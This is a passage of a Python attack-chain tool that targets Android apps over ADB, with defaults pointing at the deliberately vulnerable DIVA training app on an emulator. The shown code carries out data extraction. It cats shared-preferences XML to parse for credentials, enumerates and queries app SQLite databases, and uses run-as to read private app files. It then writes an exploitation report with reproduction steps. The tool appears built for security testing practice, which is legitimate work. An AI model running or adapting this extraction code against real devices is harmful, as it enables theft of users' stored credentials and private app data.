                attempts.append(ExploitAttempt(
                    method="shared_prefs_extraction",
                    cve_id=None,
                    code=f"adb shell cat {data_dir}/shared_prefs/*.xml",
                    output=f"Extracted {len(prefs)} bytes",
                    success=True,
                    feedback="Extracted shared preferences",
                    adaptation="Parse for credentials"
                ))

            # Databases
            _, db_list = self._adb(f"ls {data_dir}/databases/ 2>/dev/null")
            if db_list and "No such" not in db_list:
                self.extracted_data["databases"] = db_list.split('\n')

                # Try to dump database contents
                for db in db_list.split('\n'):
                    if db.endswith('.db'):
                        _, tables = self._adb(
                            f"sqlite3 {data_dir}/databases/{db} '.tables' 2>/dev/null"
                        )
                        if tables:
                            self.extracted_data[f"db_{db}_tables"] = tables

        # ─────────────────────────────────────────────────────────────────
        # Vector 3: run-as extraction
        # ─────────────────────────────────────────────────────────────────
        elif self.current_access == AccessLevel.APP_USER:
            print("  → Extracting via run-as...")
            _, files = self._adb(f"run-as {self.target_package} ls -la 2>/dev/null")
            if files:
                self.extracted_data["app_files"] = files

                # Try to read shared prefs
                _, prefs = self._adb(
                    f"run-as {self.target_package} cat shared_prefs/*.xml 2>/dev/null"
                )
                if prefs:
                    self.extracted_data["shared_preferences"] = prefs

        self.all_attempts.extend(attempts)

        return StageResult(
            stage=AttackStage.DATA_EXFILTRATION,
            success=len(self.extracted_data) > 0,
            access_achieved=self.current_access,
            method_used="multi_vector",
            output=f"Extracted from {len(self.extracted_data)} sources",
            attempts=attempts,
            duration=time.time() - start,
            next_stage_enabled=False
        )

    def _adb(self, cmd: str, timeout: int = 30) -> tuple:
        """Execute ADB command."""
        try:
            result = subprocess.run(
                ["adb", "-s", self.device_id, "shell", cmd],
                capture_output=True, text=True, timeout=timeout
            )
            return result.returncode == 0, result.stdout.strip()
        except Exception:
            return False, ""

    def _generate_report(self, duration: float) -> ExploitReport:
        """Generate comprehensive exploitation report."""

        # Build reproduction steps
        repro_steps = []
        step_num = 1

        repro_steps.append(f"{step_num}. Connect to device: adb connect {self.device_id}")
        step_num += 1

        for exploit in self.successful_exploits:
            repro_steps.append(f"{step_num}. {exploit['method']}: {exploit.get('command', exploit.get('code', '')[:100])}")
            step_num += 1

        if self.extracted_data:
            repro_steps.append(f"{step_num}. Data available in: {list(self.extracted_data.keys())}")

        report = ExploitReport(
            target_device=self.device_id,
            target_package=self.target_package,
            timestamp=datetime.now(),
            total_duration=duration,
            final_access_level=self.current_access,
            stages_completed=[r.stage.name for r in self.stage_results if r.success],
            successful_exploits=self.successful_exploits,
            failed_attempts=[
                {
                    "method": a.method,
                    "cve": a.cve_id,
                    "feedback": a.feedback,
                    "adaptation": a.adaptation,
                }
                for a in self.all_attempts if not a.success
            ],
            data_extracted=self.extracted_data,
            reproduction_steps=repro_steps,
        )

        # Save report
        self._save_report(report)

        # Print summary
        self._print_report(report)

        return report

    def _save_report(self, report: ExploitReport):
        """Save report to file."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = self.output_dir / f"report_{ts}.json"

        data = {
            "target_device": report.target_device,
            "target_package": report.target_package,
            "timestamp": report.timestamp.isoformat(),
            "duration_seconds": report.total_duration,
            "final_access_level": report.final_access_level.name,
            "stages_completed": report.stages_completed,
            "successful_exploits": report.successful_exploits,
            "failed_attempts": report.failed_attempts,
            "data_extracted_keys": list(report.data_extracted.keys()),
            "reproduction_steps": report.reproduction_steps,
        }

        path.write_text(json.dumps(data, indent=2))
        print(f"\n📄 Report saved: {path}")

    def _print_report(self, report: ExploitReport):
        """Print comprehensive report."""
        print("\n" + "═" * 70)
        print("  EXPLOITATION REPORT")
        print("═" * 70)

        print(f"\n  Target: {report.target_device}")
        print(f"  Package: {report.target_package}")
        print(f"  Duration: {report.total_duration:.1f}s")
        print(f"  Access Achieved: {report.final_access_level.name}")

        # Show installed apps with versions
        if self.device_profile.get("installed_apps"):
            print("\n  📱 INSTALLED APPLICATIONS:")
            for app in self.device_profile["installed_apps"]:
                flags = []
                if app.get("debuggable"):
                    flags.append("🔓DEBUG")
                if app.get("allows_backup"):
                    flags.append("💾BACKUP")
                flags_str = " ".join(flags) if flags else ""
                print(f"    • {app['package']} v{app['version_name']} {flags_str}")

        # Show app vulnerabilities discovered
        if self.device_profile.get("app_vulnerabilities"):
            print("\n  🔍 APP VULNERABILITIES DISCOVERED:")
            for vuln in self.device_profile["app_vulnerabilities"]:
                severity_icon = "🔴" if vuln["severity"] == "HIGH" else "🟡" if vuln["severity"] == "MEDIUM" else "🟢"
                print(f"    {severity_icon} [{vuln['severity']}] {vuln['type']}")
                print(f"       Package: {vuln['package']}")
                print(f"       Exploit: {vuln['exploitation']}")

        # Show app-specific CVEs found
        if self.device_profile.get("app_cves"):
            print("\n  🎯 APP-SPECIFIC CVEs:")
            for cve in self.device_profile["app_cves"][:5]:
                print(f"    • {cve['cve_id']} (CVSS {cve['cvss']}) - {cve['app_package']}")
                print(f"      {cve['description'][:60]}...")

        print(f"\n  Stages Completed: {', '.join(report.stages_completed)}")

        if report.successful_exploits:
            print("\n  ✓ SUCCESSFUL EXPLOITS:")
            for exp in report.successful_exploits:
                print(f"    • {exp['method']}: {exp.get('access_level', 'unknown')}")
                if exp.get('command'):
                    print(f"      Command: {exp['command']}")
                if exp.get('cve_id'):
                    print(f"      CVE: {exp['cve_id']}")

        if report.failed_attempts:
            print(f"\n  ✗ FAILED ATTEMPTS ({len(report.failed_attempts)}):")
            for att in report.failed_attempts[:5]:
                print(f"    • {att['method']}: {att['feedback'][:40]}")

        if report.data_extracted:
            print("\n  📦 DATA EXTRACTED:")
            for key in report.data_extracted.keys():
                print(f"    • {key}")

        print("\n  📋 REPRODUCTION STEPS:")
        for step in report.reproduction_steps:
            print(f"    {step}")

        print("\n" + "═" * 70)


def run_sequential_chain(device_id: str, target_package: str) -> ExploitReport:
    """Run the sequential attack chain."""
    chain = SequentialAttackChain(device_id, target_package)
    return chain.execute()


if __name__ == "__main__":
    import sys

    device_id = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:6562"
    target = sys.argv[2] if len(sys.argv) > 2 else "jakhar.aseem.diva"

    print("═" * 70)
    print("  SEQUENTIAL ATTACK CHAIN WITH FEEDBACK LOOPS")
    print("═" * 70)
    print(f"  Target Device: {device_id}")
    print(f"  Target Package: {target}")
    print("═" * 70 + "\n")

    run_sequential_chain(device_id, target)
